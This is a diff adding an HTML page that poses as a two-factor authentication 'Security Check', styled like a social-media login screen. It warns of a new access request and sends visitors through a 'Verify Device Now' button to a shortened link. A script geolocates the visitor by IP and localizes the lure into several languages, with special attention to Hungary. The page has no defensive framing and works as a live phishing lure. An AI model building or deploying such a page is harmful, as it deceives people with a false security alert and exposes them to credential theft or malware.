@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Check</title>
+    <style>
+        /* Tối ưu hóa font chữ để mượt và thanh mảnh hơn */
+        body { 
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            height: 100vh; 
+            margin: 0; 
+            background-color: #f0f2f5; 
+            -webkit-font-smoothing: antialiased; /* Khử răng cưa giúp chữ mảnh hơn */
+            -moz-osx-font-smoothing: grayscale;
+        }
+
+        .card { 
+            background: white; 
+            padding: 30px; 
+            border-radius: 8px; 
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1); 
+            text-align: center; 
+            max-width: 400px; 
+            width: 90%; 
+        }
+
+        .loader { 
+            border: 4px solid #f3f3f3; 
+            border-top: 4px solid #1877f2; 
+            border-radius: 50%; 
+            width: 40px; 
+            height: 40px; 
+            animation: spin 1s linear infinite; 
+            margin: 0 auto 20px; 
+        }
+
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        /* Khống chế độ đậm của tiêu đề */
+        h2 { 
+            font-size: 18px; 
+            color: #1c1e21; 
+            font-weight: 600; /* Độ đậm vừa phải, không bị thô */
+            margin-bottom: 15px;
+            margin-top: 0;
+        }
+
+        /* Khống chế độ mảnh của đoạn văn */
+        p { 
+            color: #606770; 
+            font-size: 14px; 
+            line-height: 1.5; 
+            margin-bottom: 25px; 
+            font-weight: 400; /* Chữ bình thường, không đậm */
+        }
+
+        button { 
+            background-color: #1877f2; 
+            color: white; 
+            border: none; 
+            padding: 12px 24px; 
+            border-radius: 6px; 
+            font-weight: 600; 
+            cursor: pointer; 
+            font-size: 16px; 
+            transition: 0.3s; 
+            width: 100%; 
+        }
+
+        button:hover { background-color: #166fe5; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="loader"></div>
+        <h2 id="title">Two-Factor Authentication (2FA)</h2>
+        <p id="desc">A new access request has been detected. Please verify your browser to complete the security check.</p>
+        <button id="btn" onclick="window.location.href='https://bom.so/RUINz4'">Verify Device Now</button>
+    </div>
+
+    <script>
+        const translations = {
+            'vi': { t: 'Xác thực bảo mật 2 lớp (2FA)', d: 'Chúng tôi đã phát hiện một yêu cầu truy cập mới. Vui lòng xác minh trình duyệt của bạn để hoàn tất quá trình kiểm tra an toàn.', b: 'Xác minh thiết bị ngay' },
+            'en': { t: 'Two-Factor Authentication (2FA)', d: 'A new access request has been detected. Please verify your browser to complete the security check.', b: 'Verify Device Now' },
+            'hu': { t: 'Kétfaktoros hitelesítés (2FA)', d: 'Új hozzáférési kérelem észlelhető. Kérjük, igazolja böngészőjét a biztonsági ellenőrzés befejezéséhez.', b: 'Eszköz igazolása most' },
+            'de': { t: 'Zwei-Faktor-Authentisierung (2FA)', d: 'Eine neue Zugriffsanfrage wurde erkannt. Bitte verifizieren Sie Ihren Browser, um die Sicherheitsprüfung abzuschließen.', b: 'Gerät jetzt verifizieren' },
+            'fr': { t: 'Authentification à deux facteurs (2FA)', d: 'Une nouvelle demande d\'accès a été détectée. Veuillez vérifier votre navigateur pour compléter le contrôle de sécurité.', b: 'Vérifier l\'appareil maintenant' },
+            'ar': { t: 'المصادقة الثنائية (2FA)', d: 'تم اكتشاف طلب وصول جديد. يرجى التحقق من متصفحك لإكمال فحص الأمان.', b: 'تحقق من الجهاز الآن' },
+            'el': { t: 'Έλεγχος ταυτότητας δύο παραγόντων (2FA)', d: 'Εντοπίστηκε νέο αίτημα πρόσβασης. Επαληθεύστε το πρόγραμμα περιήγησής σας για να ολοκληρώσετε τον έλεγχο ασφαλείας.', b: 'Επαλήθευση συσκευής τώρα' }
+        };
+
+        function setContent(langCode) {
+            const lang = translations[langCode] || translations['en'];
+            document.getElementById('title').innerText = lang.t;
+            document.getElementById('desc').innerText = lang.d;
+            document.getElementById('btn').innerText = lang.b;
+            if (langCode === 'ar') document.body.style.direction = 'rtl';
+            else document.body.style.direction = 'ltr';
+        }
+
+        async function initSecurityCheck() {
+            // Khởi tạo nhanh bằng ngôn ngữ trình duyệt
+            let browserLang = (navigator.language || navigator.userLanguage).substring(0, 2).toLowerCase();
+            setContent(browserLang);
+
+            // Kiểm tra chính xác theo IP (đặc biệt cho Hungary)
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
+                
+                if (data && data.country_code) {
+                    const country = data.country_code.toLowerCase();
+                    if (country !== browserLang) {
+                        setContent(country);
+                    }
+                }
+            } catch (e) {
+                console.log("Sử dụng ngôn ngữ mặc định.");
+            }
+        }
+
+        initSecurityCheck();
+    </script>
+</body>
+</html>
